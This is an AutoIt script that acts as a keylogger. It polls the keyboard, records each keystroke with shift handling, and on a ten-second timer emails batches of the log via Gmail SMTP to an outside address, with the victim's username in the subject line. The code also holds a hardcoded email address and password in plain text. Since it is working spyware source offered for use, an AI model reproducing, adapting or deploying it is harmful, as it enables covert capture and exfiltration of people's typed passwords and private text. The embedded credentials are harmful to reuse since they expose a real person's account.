#include <Misc.au3>
#include <Inet.au3>
#include <MsgBoxConstants.au3>
#include <array.au3>
#include <File.au3>
Global $log_string =""
Global $oMyRet[2]
Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")

Global $dll = DllOpen("user32.dll")
AdlibRegister("send_mail",10000)
Global $as_Body[1]

while 1
	for $i=Dec(01) to Dec("ff")
				if _IsPressed(Hex($i,2),$dll) then
					if $i= 160 then
						shift()
					Else
						while  _IsPressed(Hex($i,2),$dll)
							Sleep(20)
						WEnd
						Log_($i)
					EndIf
				EndIf
	Next

WEnd

func shift()
	while 1
		for $i=Dec(30) to Dec("ff")
			if $i = 160 Then ContinueLoop
					if _IsPressed(Hex($i,2),$dll) then

						while  _IsPressed(Hex($i,2),$dll)
							Sleep(20)
						WEnd
							if $i >=65 and $i <=90 Then
								$i += 32
							EndIf
							Log_($i)
							ExitLoop(2)
					EndIf
		Next

	WEnd
EndFunc

func log_($i)
	$message = Chr($i) & "[" & $i & "]"

	Switch $i
		Case 1 ;left mouse

			$message = "linke maustaste " & "[" & $i & "]"
	EndSwitch

	$log_string &= Chr($i)
	_ArrayAdd($as_Body , $message )
EndFunc

func send_mail()
	_ArrayDisplay($as_Body)

						$SmtpServer = "Smtp.gmail.com" ; address for the smtp-server to use - REQUIRED
                        $FromName = "Someone" ; name from who the email was sent
                        $FromAddress = "a@b.de" ; address from where the mail should come
                        $ToAddress = "nils.zenker@gmx.de" ; destination address of the email - REQUIRED
                        $Subject = "log from " & @UserName ; subject from the email - can be anything you want it to be
                        $Body = $as_Body ; the messagebody from the mail - can be left blank but then you get a blank mail
                        $AttachFiles = "" ; the file(s) you want to attach seperated with a ; (Semicolon) - leave blank if not needed
                        $CcAddress = "" ; address for cc - leave blank if not needed
                        $BccAddress = "" ; address for bcc - leave blank if not needed
                        $Importance = "Normal" ; Send message priority: "High", "Normal", "Low"
                        $Username = "nils.zenker.handy@gmail.com" ; username for the account used from where the mail gets sent - REQUIRED
                        $Password = "Sonic1989" ; password for the account used from where the mail gets sent - REQUIRED
                        $IPPort = 465 ; port used for sending the mail
                        $ssl = 1
;jkhbwkkwmflkwjmrlckwejocmrkwoerjvwmjrowvkernhlehmpoivjmrowemjvrpow,wivrhmwlervhwirhowiuhvr,womhrovweuhrmvoweirhmoeuwverhmowiuhrowiurhomuwerhoiewuhrowiurhiweourhiweuhrmvowirhm
	if UBound($as_Body)>50 then
			$rc = _INetSmtpMailCom($SmtpServer, $FromName, $FromAddress, $ToAddress, $Subject, $Body, $AttachFiles, $CcAddress, $BccAddress, $Importance, $Username, $Password, $IPPort, $ssl)

			Local $iErr = @error
			If $rc = 1 Then
				MsgBox($MB_SYSTEMMODAL, "Success!", "Mail sent")
			Else
				MsgBox($MB_SYSTEMMODAL, "Error!", "Mail failed with error code " & $iErr)
			EndIf

			Local $sRange = "1-" & UBound($as_Body)-1
			_ArrayDelete($as_Body, $sRange)
			$log_string = ""
	EndIf

EndFunc

; The UDF
Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Importance = "Normal", $s_Username = "", $s_Password = "", $IPPort = 25, $ssl = 0)
        Local $objEmail = ObjCreate("CDO.Message")
        $objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
        $objEmail.To = $s_ToAddress
        Local $i_Error = 0
        Local $i_Error_desciption = ""
        If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
        If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
        $objEmail.Subject = $s_Subject
        If StringInStr($as_Body, "<") And StringInStr($as_Body, ">") Then
                $objEmail.HTMLBody = $as_Body
        Else
                $objEmail.Textbody = $as_Body & @CRLF
		EndIf

		if IsArray($as_Body) then
			 Local $sString = ""
				For $vElement In $as_Body
					$sString = $sString & $vElement & @CRLF
				Next
			$objEmail.Textbody = $log_string & @CRLF & $sString
		EndIf

        If $s_AttachFiles <> "" Then
                Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
                For $x = 1 To $S_Files2Attach[0]
                        $S_Files2Attach[$x] = _PathFull($S_Files2Attach[$x])
;~          ConsoleWrite('@@ Debug : $S_Files2Attach[$x] = ' & $S_Files2Attach[$x] & @LF & '>Error code: ' & @error & @LF) ;### Debug Console
                        If FileExists($S_Files2Attach[$x]) Then
                                ConsoleWrite('+> File attachment added: ' & $S_Files2Attach[$x] & @LF)
                                $objEmail.AddAttachment($S_Files2Attach[$x])
                        Else
                                ConsoleWrite('!> File not found to attach: ' & $S_Files2Attach[$x] & @LF)
                                SetError(1)
                                Return 0
                        EndIf
                Next
        EndIf
        $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
        $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
        If Number($IPPort) = 0 Then $IPPort = 25
        $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
        ;Authenticated SMTP
        If $s_Username <> "" Then
                $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
                $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
                $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
        EndIf
        If $ssl Then
                $objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
        EndIf
        ;Update settings
        $objEmail.Configuration.Fields.Update
        ; Set Email Importance
        Switch $s_Importance
                Case "High"
                        $objEmail.Fields.Item("urn:schemas:mailheader:Importance") = "High"
                Case "Normal"
                        $objEmail.Fields.Item("urn:schemas:mailheader:Importance") = "Normal"
                Case "Low"
                        $objEmail.Fields.Item("urn:schemas:mailheader:Importance") = "Low"
        EndSwitch
        $objEmail.Fields.Update
        ; Sent the Message
        $objEmail.Send

        If @error Then
                SetError(2)
                Return $oMyRet[1]
		Else
				Return 1
		EndIf


        $objEmail = ""
EndFunc   ;==>_INetSmtpMailCom
;
;
; Com Error Handler
Func MyErrFunc()
        $HexNumber = Hex($oMyError.number, 8)
        $oMyRet[0] = $HexNumber
        $oMyRet[1] = StringStripWS($oMyError.description, 3)
        ConsoleWrite("### COM Error !  Number: " & $HexNumber & "   ScriptLine: " & $oMyError.scriptline & "   Description:" & $oMyRet[1] & @LF)
        SetError(1); something to check for when this function returns
        Return
EndFunc   ;==>MyErrFunc